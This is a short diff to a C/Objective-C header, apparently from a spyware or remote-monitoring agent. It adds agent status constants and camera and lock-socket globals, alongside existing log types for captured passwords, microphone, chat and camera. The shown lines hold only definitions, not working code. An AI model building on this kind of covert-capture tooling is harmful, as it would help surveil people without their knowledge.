@@ -188,6 +188,8 @@ extern u_int remoteAgents[];
 #define AGENT_ENABLED     @"ENABLED"
 #define AGENT_RUNNING     @"RUNNING"
 #define AGENT_STOPPED     @"STOPPED"
+#define AGENT_SUSPENDED   @"SUSPENDED"
+#define AGENT_RESTART     @"RESTART"
 
 // Monitor Status
 #define EVENT_RUNNING     @"RUNNING"
@@ -244,7 +246,7 @@ extern u_int remoteAgents[];
 #define LOG_PASSWORD        0xFAFA
 #define LOG_MICROPHONE      0xC2C2
 #define LOG_CHAT            0xC6C6
-#define LOG_CAMSHOT         0xE9E9
+#define LOG_CAMERA          0xE9E9
 #define LOG_APPLICATION     0x1011
 #define LOG_FILESYSTEM      0xEDA1
 
@@ -448,6 +450,8 @@ extern NSString *gConfigurationName;
 extern NSString *gConfigurationUpdateName;
 extern BOOL     gAgentCrisis;
 extern NSData   *gSessionKey;
+extern BOOL     gCameraActive;
+extern int      gLockSock;
 
 // OS version
 extern u_int gOSMajor;
